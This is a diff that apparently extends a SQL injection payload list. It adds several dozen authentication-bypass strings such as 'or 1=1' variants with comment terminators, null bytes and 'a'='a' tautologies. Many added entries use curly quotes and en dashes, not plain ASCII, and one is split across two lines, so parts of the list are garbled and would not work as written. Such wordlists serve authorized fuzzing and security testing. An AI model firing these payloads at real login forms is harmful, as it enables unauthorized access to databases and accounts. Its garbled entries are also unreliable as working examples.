@@ -4,3 +4,36 @@ test' or 1='1' -- -
 1' or 1='1 #
 1' and 1=1 #
 ') or 1=1 -- -
+or 1=1
+‘or 1=1
+“or 1=1
+or 1=1–
+‘or 1=1–
+“or 1=1–
+or 1=1#
+‘or 1=1#
+“or
+1=1#
+or 1=1/*
+‘or 1=1/*
+“or 1=1/*
+or 1=1;%00
+‘or 1=1;%00
+“or 1=1;%00
+‘or’
+‘or
+‘or’–
+‘or–
+or a=a
+‘or a=a
+“or a=a
+or a=a–
+‘or a=a —
+“or a=a–
+or ‘a’=’a’
+‘or ‘a’=’a’
+“or ‘a’=’a’
+‘)or(‘a’=’a’
+“)”a”=”a”
+‘)’a’=’a
+‘or”=’
